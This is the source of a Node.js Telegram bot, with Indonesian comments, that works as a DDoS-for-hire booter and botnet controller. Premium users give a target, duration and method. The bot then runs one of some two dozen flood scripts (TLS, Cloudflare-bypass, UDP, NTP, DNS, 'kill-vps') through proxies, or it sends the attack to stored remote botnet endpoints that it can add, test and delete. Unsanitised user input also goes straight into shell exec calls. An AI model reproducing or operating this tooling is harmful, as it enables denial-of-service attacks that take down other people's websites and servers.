const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const chalk = require('chalk');
const os = require('os');
const axios = require('axios');
const path = require('path');
const scrapeProxies = require('./proxy.js');
const settings = require('./settings.js'); // Import settings dari setting.js
const owner = settings.owner;
const adminfile = 'all/owner.json';
const premiumUsersFile = 'all/prem.json';
try {
    premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
    console.error('Error reading premiumUsers file:', error);
}
try {
    adminUsers = JSON.parse(fs.readFileSync(adminfile));
} catch (error) {
    console.error('Error reading adminUsers file:', error);
}

// Token bot Telegram kamu
const bot = new TelegramBot(settings.botToken, { polling: true });

// File untuk logging
const logFile = 'bot.log';

// Fungsi untuk menulis log ke file dan console
function logToFileAndConsole(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  console.log(logMessage);
  fs.appendFileSync(logFile, logMessage);
}

// Fungsi untuk memproses pesan dan mengirim ke API
const getAIResponse = async (message) => {
  try {
    const response = await axios.get(`https://api.agatz.xyz/api/blackboxAIChat?message=${encodeURIComponent(message)}&webSearchMode=true`);
    let pepek = await response.data
    return pepek.data; // Sesuaikan jika respon API berbeda format
  } catch (error) {
    console.error('Error fetching from AI API:', error);
    return 'Maaf, terjadi kesalahan saat menghubungi AI.';
  }
};

//Awal Dari dimulainya bot 
console.log(chalk.greenBright(' ===================================================='))
console.log(chalk.greenBright(' │ + Owner    : ' + settings.ownerName || ''))
console.log(chalk.greenBright(' │ + Version  : 2.1.5' || ''))
console.log(chalk.greenBright(' │ + Host     : ' + os.hostname() || ''))
console.log(chalk.greenBright(' │ + Platfrom : ' + os.platform() || ''))
console.log(chalk.greenBright(' ===================================================='))
console.log(chalk.whiteBright('╭─── [ LOG ]'))
 
// Mulai dengan scraping proxy saat bot dijalankan
scrapeProxies();

// Command /start untuk memunculkan contoh command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Kirim pesan awal
  bot.sendMessage(chatId, "Starting...").then(sentMessage => {
    // Update pesan dengan ">Dirzz Bot<" setelah 1 detik
    setTimeout(() => {
      bot.editMessageText(">Dirzz Bot<", {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });

      // Update pesan dengan "V2.1.5" setelah 1 detik
      setTimeout(() => {
        bot.editMessageText(">Dirzz Bot<\nV2.1.5", {
          chat_id: chatId,
          message_id: sentMessage.message_id
        });

        // Update pesan dengan daftar perintah setelah 1 detik
        setTimeout(() => {
          const message = `>Dirzz Bot<\nV2.1.5

▬▭▬▭▬▭▬▭▬▭▬▭▬
Attack Command
- /attack
- /stress
- /botnet
- /spampair
▬▭▬▭▬▭▬▭▬▭▬▭▬
Botnet Control
- /listbotnet
- /addbotnet
- /testbotnet
- /delbotnet
▬▭▬▭▬▭▬▭▬▭▬▭▬
Preparation Command
- /methods
- /updateproxy
- /proxycount
- /uacount
▬▭▬▭▬▭▬▭▬▭▬▭▬
Owner Command
- /addprem
- /delprem
▬▭▬▭▬▭▬▭▬▭▬▭▬

©Dirzz`;

          bot.editMessageText(message, {
            chat_id: chatId,
            message_id: sentMessage.message_id
          });

          // Tambahkan button setelah 1 detik
          setTimeout(() => {
            const options = {
              reply_markup: {
                inline_keyboard: [
                  [{ text: "Hubungi Admin", url: "https://t.me/zhdirdhz" }]
                ]
              }
            };

            bot.editMessageReplyMarkup(options.reply_markup, {
              chat_id: chatId,
              message_id: sentMessage.message_id
            });

            logToFileAndConsole(`Send /start message in chat ${chatId}`);
          }, 1000); // 1000 ms = 1 second delay
          
        }, 1000); // 1000 ms = 1 second delay
      }, 1000); // 1000 ms = 1 second delay
    }, 1000); // 1000 ms = 1 second delay
  });
});

// Command /updateproxy untuk memperbarui proxy
bot.onText(/\/updateproxy/, (msg) => {
  const chatId = msg.chat.id;

  // Kirim pesan awal
  bot.sendMessage(chatId, "Updating proxy...").then(sentMessage => {
    // Tunggu 5 detik (5000 ms) sebelum mengubah pesan
    setTimeout(() => {
      // Panggil fungsi untuk memperbarui proxy
      scrapeProxies();

      // Ubah pesan menjadi "Proxy updated successfully"
      bot.editMessageText("Proxy updated successfully", {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });

      logToFileAndConsole(`Updated /updateproxy message in chat ${chatId}`);
    }, 5000); // 5000 ms = 5 seconds delay
  });
}); 

// Command /method untuk menunjukkan metode yang tersedia
bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  
  // Kirim pesan awal
  bot.sendMessage(chatId, "Dirz Is Here").then(sentMessage => {
    // Tambahkan delay 3 detik (3000 ms) sebelum mengedit pesan
    setTimeout(() => {
      let message = `≡ 𒄆DDoS Method Layer 7🪽
┌─⊷
 |- tls
 |- strike
 |- flood
 |- spike
 |- raw
 |- gojo
 |- thunder
 |- bypass
 |- rape
 |- traffic
 |- http-vip
 |- storm
 |- destroy
 |- tlskill
 |- tlsop
 |- tls-slow 
 |- raw-mix
 |- tornado
 |- drown
 |- uam
 |- cookie
└───────────
≡ 𒄆DDoS Method Layer 4🪽
┌─⊷
 | -udp
 | -tcp 
 | -dns
 | -kill-vps
 | -ovh
 | -ntp
└───────────; `

      // Edit pesan yang sudah dikirim
      bot.editMessageText(message, {
        chat_id: chatId,
        message_id: sentMessage.message_id
      });
      
      logToFileAndConsole(`Updated /methods message in chat ${chatId}`);
    }, 3000); // 3000 ms = 3 seconds delay
  });
});


// Command /attack untuk meluncurkan perintah di VPS
bot.onText(/\/attack (.+) (.+) (.+)(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPrem = premiumUsers.includes(String(msg.from.id));  
  
  if (!isPrem) return bot.sendMessage(chatId, 'Kamu siapa?');

  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil duration dari command
  const port = match[4] || ''; // Ambil port dari command, jika ada (optional)
  let command;

  try {
    const parsedUrl = new URL(target);
    const hostname = parsedUrl.hostname;

    // Mengambil data dari IP-API
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const result = response.data;

    const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n*Start Time:* ${new Date().toLocaleString()}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖\n*Owner : ( @zhdirdhz )*\n*Power-Proof : ( @dirzpower )*`;

    // Switch case untuk menentukan perintah yang dijalankan
    switch (method) {
      case 'strike':
        command = `node methods/strike.js GET ${target} ${duration} 10 90 proxy.txt --full --legit`;
        break;
      case 'tls':
        command = `node methods/tls.js ${target} ${duration} 100 10`;
        break;
      case 'flood':
        command = `node methods/flood.js ${target} ${duration}`;
        break;
      case 'spike':
        command = `node methods/spike.js ${target} 10 ${duration}`;
        break;
      case 'raw':
        command = `node methods/raw.js ${target} ${duration}`;
        break;
      case 'gojo':
        command = `node methods/gojov5.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'tlskill':
        command = `node methods/TLS-KILL.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'tlsop':
        command = `node methods/tlsop.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'storm':
        command = `node methods/storm.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'destroy':
        command = `node methods/DESTROY.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'thunder':
        command = `node methods/thunder.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'bypass':
        command = `node methods/bypass.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'cf-flood':
        command = `node methods/cf-flood.js ${target} ${duration}`;
        break;
      case 'http-vip':
        command = `node methods/HTTP-VIP.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'uam':
        command = `node methods/uambypass.js ${target} ${duration} 100 proxy.txt`;
        break;
      case 'rape':
        command = `node methods/rape.js GET ${duration} 10 proxy.txt 100 ${target}`;
        break;
      case 'tornado':
        command = `node methods/TORNADOV2.js GET ${target} ${duration} 10 100 proxy.txt`;
        break;
      case 'raw-mix':
        command = `node methods/RAW-MIX.js ${target} ${duration}`;
        break;
      case 'drown':
        command = `node methods/drown.js ${target} ${duration} 10 100`;
        break;
      case 'cookie':
        command = `node methods/cookie.js ${target} ${duration} 10 100 proxy.txt`;
        break;
      case 'tls-slow':
        command = `node methods/YAT-TLS.js ${target} ${duration} 100 10 proxy.txt`;
        break;
      case 'spampair':
        command = `node lib/spampair.js ${target} ${duration}`;
        break;
      default:
        bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /method untuk melihat metode yang tersedia.");
        return;
    }

    // Log ke file dan console
    logToFileAndConsole(`Received /attack command from chat ${chatId}. Executing: ${command}`);

    // Kirim pesan bahwa attack telah diluncurkan
    bot.sendMessage(chatId, `\`\`\`Attack Command Executed!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\n${deepinfo} \`\`\``, { parse_mode: 'Markdown' });

    // Eksekusi command
    exec(command, (error, stdout, stderr) => {
      if (error) {
        const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
        bot.sendMessage(chatId, errorMessage);
        logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
        return;
      }
      if (stderr) {
        const stderrMessage = `Stderr: ${stderr}`;
        bot.sendMessage(chatId, stderrMessage);
        logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
        return;
      }
      const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
      bot.sendMessage(chatId, successMessage);
      logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
    });
  } catch (error) {
    bot.sendMessage(chatId, "Terjadi kesalahan saat mengambil data target atau menjalankan perintah.");
    logToFileAndConsole(`Error occurred for chat ${chatId}: ${error.message}`);
  }
});


bot.onText(/\/stress (.+) (.+) (.+) (.+)(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPrem = premiumUsers.includes(String(msg.from.id));  
  if (!isPrem) return bot.sendMessage(chatId, 'Kamu siapa?');
  const method = match[1]; // Ambil method dari command
  const target = match[2]; // Ambil target dari command
  const duration = match[3]; // Ambil duration dari command
  const port = match[4] || ''; // Ambil port dari command
  let command;

  switch (method) {
    case 'udp':
      command = `node methods/udp.js ${target} ${port} ${duration}`;
      break;
    case 'kill-vps':
      exec(`node methods/StarsXSSH.js ${target} 22 root ${duration}`)
      exec(`node methods/flood.js https://${target} ${duration}`)
      exec(`node methods/raw.js http://${target} ${duration}`)
      break;
    case 'tcp':
      command = `node methods/tcp.js ${target} ${port} ${duration}`
      break;
    case 'dns':
      command = `node methods/dns.js ${target} ${port} ${duration}`
      break;
    case 'ntp':
      command = `node methods/ntp.js ${target} ${port} ${duration}`
      break;
    case 'ovh':
      command = `node methods/ovh.js ${target} ${port} ${duration}`
      break;
    case 'spampair':
      command = `node lib/spampair.js ${target} ${duration}`
      break;
    default:
      bot.sendMessage(chatId, "Metode tidak dikenali atau format salah. Gunakan /method untuk melihat metode yang tersedia.");
      return;
  }
  logToFileAndConsole(`Received /stress command from chat ${chatId}. Executing: ${command}`);
  // Kirim pesan bahwa attack telah diluncurkan
  bot.sendMessage(chatId, `\`\`\`Attack Attack launched!\nTarget: ${target}\nDuration: ${duration}\nMethod: ${method}\nPort: ${port}\`\`\``, { parse_mode: 'Markdown' });
  
  exec(command, (error, stdout, stderr) => {
    if (error) {
      const errorMessage = `Error: ${error.message}\nStderr: ${stderr}`;
      bot.sendMessage(chatId, errorMessage);
      logToFileAndConsole(`Execution error for chat ${chatId}: ${errorMessage}`);
      return;
    }
    if (stderr) {
      const stderrMessage = `Stderr: ${stderr}`;
      bot.sendMessage(chatId, stderrMessage);
      logToFileAndConsole(`Execution stderr for chat ${chatId}: ${stderr}`);
      return;
    }
    const successMessage = `Command sukses dijalankan! Output:\n${stdout}`;
    bot.sendMessage(chatId, successMessage);
    logToFileAndConsole(`Command executed successfully for chat ${chatId}. Output: ${stdout}`);
  });
});
// Handler untuk command /proxycount
bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;

  fs.readFile('proxy.txt', 'utf8', (err, data) => {
    if (err) {
      bot.sendMessage(chatId, "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses.");
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split('\n').filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(chatId, `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`);
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});    
//Ua Count command
bot.onText(/\/uacount/, (msg) => {
  const chatId = msg.chat.id;

  fs.readFile('ua.txt', 'utf8', (err, data) => {
    if (err) {
      bot.sendMessage(chatId, "Gagal membaca file ua.txt. Pastikan file tersebut ada dan bisa diakses.");
      logToFileAndConsole(`Error reading ua.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split('\n').filter(Boolean);
    const uaCount = proxies.length;

    bot.sendMessage(chatId, `Jumlah User Agent yang ada di ua.txt: ${uaCount}`);
    logToFileAndConsole(`Sent ua count: ${uaCount} to chat ${chatId}`);
  });
});      
// Listener untuk command /ai
bot.onText(/\/ai (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userMessage = match[1];

  bot.sendMessage(chatId, 'Menghubungi Blackbox AI...');

  // Dapatkan respon dari API
  const aiResponse = await getAIResponse(userMessage);

  // Kirimkan hasil respon ke user
  bot.sendMessage(chatId, aiResponse);
});

//Tambah Premium
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!premiumUsers.includes(userId)) {
            premiumUsers.push(userId);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

//Hapus Premium
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = premiumUsers.indexOf(userId);
        if (index !== -1) {
            premiumUsers.splice(index, 1);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

//Botnet
async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    }

    return successCount;
}
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

bot.onText(/\/botnet(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username;

    // Periksa jika kurang dari 3 argumen yang diberikan
    if (!match[1] || !match[2] || !match[3]) {
        return bot.sendMessage(chatId, '[🔎] Format: /botnet [target] [duration] [methods]\nExample: /botnet http://example.com 60 tls', { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, 'Wait A Seconds...');
   
    // Mendapatkan waktu saat serangan dimulai
    const startTime = new Date().toLocaleString();

    const [target, duration, methods] = [match[1].trim(), match[2].trim(), match[3].trim()];

    try {
        const parsedUrl = new URL(target);
        const hostname = parsedUrl.hostname;
        const path = parsedUrl.pathname;

        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = response.data;

        const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n*Start Time:* ${startTime}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n*Owner : (  @zhdirdhz  )*\n*Power-Proof : (  @dirzpower  )*`;
        const botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        const endpoints = botnetData.endpoints;

        const successCount = await PermenMDBotnet(endpoints, target, duration, methods);

        bot.sendMessage(chatId, `*🔴 Attack Succesfully Sent To🔴*\n\n*Attack By:* @${username}\n*Botnet Online:* ${successCount}\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration} seconds\n${deepinfo}`, {
            parse_mode: 'Markdown',
            reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔍Check Target',
              url: `https://check-host.net/check-http?host=${target}`
            },
            {
              text: '🔍Join Channel',
              url: `https://t.me/dirzpower`
            }
          ],
          [
            {
              text: '👑Owner',
              url: `https://t.me/zhdirdhz`
            }
          ]
        ]
      },
            reply_to_message_id: msg.message_id,
        });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        bot.sendMessage(chatId, '*[❗] Terjadi kesalahan saat mencoba mendapatkan informasi target.*', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/addbotnet(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = match[1] ? match[1].trim() : '';  // Cek apakah ada argumen

    if (!text) {
        return bot.sendMessage(chatId, 'Usage: /addbotnet <endpoint>\nExample: /addbotnet http://123.123.123.123:1234/permen');
    }

    try {
        const parsedUrl = new URL(text);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';
        const botnetData = loadBotnetData();

        if (botnetData.endpoints.includes(endpoint)) {
            return bot.sendMessage(chatId, `Endpoint ${endpoint} is already in the botnet list.`);
        }

        botnetData.endpoints.push(endpoint);
        saveBotnetData(botnetData);
        bot.sendMessage(chatId, `Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        bot.sendMessage(chatId, `Invalid URL: ${text}`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/testbotnet/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    bot.sendMessage(chatId, 'Wait A Second...');

    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    bot.sendMessage(chatId, `Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/listbotnet/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const botnetData = loadBotnetData();

    if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, 'Botnet list is empty.');
    }

    let response = '*Current Botnet:*\n';
    botnetData.endpoints.forEach((endpoint, index) => {
        response += `${index + 1}. ${endpoint}\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delbotnet (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const index = parseInt(match[1]) - 1;  // Konversi ke indeks array

    // Muat data botnet
    let botnetData;
    try {
        botnetData = loadBotnetData();
    } catch (error) {
        console.error('Error loading botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal memuat data botnet.*');
    }

    // Cek apakah array endpoints ada dan valid
    if (!Array.isArray(botnetData.endpoints)) {
        return bot.sendMessage(chatId, '*❌ Data endpoints tidak valid.*');
    }

    // Cek validitas indeks yang dimasukkan
    if (isNaN(index) || index < 0 || index >= botnetData.endpoints.length) {
        return bot.sendMessage(chatId, `Invalid index. Please provide a valid index from 1 to ${botnetData.endpoints.length}.`);
    }

    // Hapus endpoint yang sesuai
    botnetData.endpoints.splice(index, 1);

    // Simpan data botnet yang telah diperbarui
    try {
        saveBotnetData(botnetData);
    } catch (error) {
        console.error('Error saving botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal menyimpan perubahan data botnet.*');
    }

    bot.sendMessage(chatId, 'Botnet endpoint deleted successfully.');
});
//End

//Spam Pairing 

// Command /ongoing untuk mengecek command yang sedang berjalan
bot.onText(/\/ongoing/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "Tidak ada command yang sedang berjalan.");
  logToFileAndConsole(`Checked ongoing commands for chat ${chatId}`);
});
